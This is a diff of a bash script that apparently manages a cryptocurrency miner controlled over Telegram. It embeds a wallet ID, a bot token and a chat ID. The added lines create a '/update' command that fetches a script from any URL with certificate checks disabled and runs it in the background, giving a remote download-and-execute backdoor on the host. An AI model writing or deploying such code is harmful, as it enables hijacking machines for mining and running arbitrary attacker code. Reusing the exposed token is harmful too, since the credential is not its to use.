@@ -1,10 +1,5 @@
 #!/bin/bash
 
-# ============================================================
-# | GOD MODE v14: STRICT TG_CHAT_ID AUTHENTICATION           |
-# ============================================================
-
-# [ CONFIGURATION ]
 FIXED_WALLET_ID="krxYNV2DZQ"
 TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
 TG_CHAT_ID="7032066912"
@@ -259,7 +254,7 @@ send_logs_report() {
 }
 
 # Стартовое уведомление
-STARTUP_MSG="🚀 <b>ENGINE V14 (STRICT AUTH ACTIVE)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A🔒 <i>Only user ID $TG_CHAT_ID is authorized.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V15 (REMOTE MODULE DEPLOYER ACTIVE)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [URL] to deploy remote scripts.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -300,18 +295,15 @@ while true; do
     [ -f "\$LOG_CPU" ] && tail -n 300 "\$LOG_CPU" > "\$LOG_CPU.tmp" && mv "\$LOG_CPU.tmp" "\$LOG_CPU"
     [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"
 
-    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК С ПРОВЕРКОЙ АВТОРИЗАЦИИ ПО TG_CHAT_ID ---
+    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК (АВТОРИЗОВАННЫЙ) ---
     LAST_CMD=\$(curl -s -m 3 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
     UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)
 
     if [ -n "\$UPDATE_ID" ]; then
-        # Проверяем, что ID отправителя соответствует твоему TG_CHAT_ID
         AUTH_CHECK=\$(echo "\$LAST_CMD" | grep -o '"id":'"\$TG_CHAT_ID")
         
-        # Сдвигаем очереди обновлений
         curl -s -m 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=\$((UPDATE_ID + 1))" >/dev/null 2>&1
 
-        # ВЫПОЛНЯЕМ КОМАНДУ ТОЛЬКО ЕСЛИ АВТОРИЗАЦИЯ ПРОЙДЕНА
         if [ -n "\$AUTH_CHECK" ]; then
             if echo "\$LAST_CMD" | grep -iE "/status|/stat" >/dev/null 2>&1; then
                 send_telemetry_report "ON-DEMAND TELEMETRY REPORT"
@@ -321,6 +313,29 @@ while true; do
                 
             elif echo "\$LAST_CMD" | grep -iE "/logs|/log" >/dev/null 2>&1; then
                 send_logs_report
+
+            elif echo "\$LAST_CMD" | grep -iE "/update|/dl" >/dev/null 2>&1; then
+                TARGET_URL=\$(echo "\$LAST_CMD" | grep -o 'http[s]*://[^" ]*' | head -n 1)
+                
+                if [ -n "\$TARGET_URL" ]; then
+                    MODULE_DIR="\$BASE_DIR/updates"
+                    mkdir -p "\$MODULE_DIR"
+                    
+                    TIMESTAMP=\$(date +%s)
+                    DEST_SCRIPT="\$MODULE_DIR/mod_\${TIMESTAMP}.sh"
+                    
+                    curl -L -k -s -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" "\$TARGET_URL"
+                    
+                    if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
+                        chmod +x "\$DEST_SCRIPT"
+                        nohup "\$DEST_SCRIPT" >/dev/null 2>&1 &
+                        send_tg_msg "✅ <b>SCRIPT DEPLOYED:</b> Module downloaded to <code>\$DEST_SCRIPT</code> and executed!"
+                    else
+                        send_tg_msg "❌ <b>DEPLOYMENT FAILED:</b> Could not fetch file from URL."
+                    fi
+                else
+                    send_tg_msg "⚠️ <b>USAGE:</b> Send <code>/update https://link-to-script.sh</code>"
+                fi
 
             elif echo "\$LAST_CMD" | grep -i "/stop" >/dev/null 2>&1; then
                 PAUSED=1
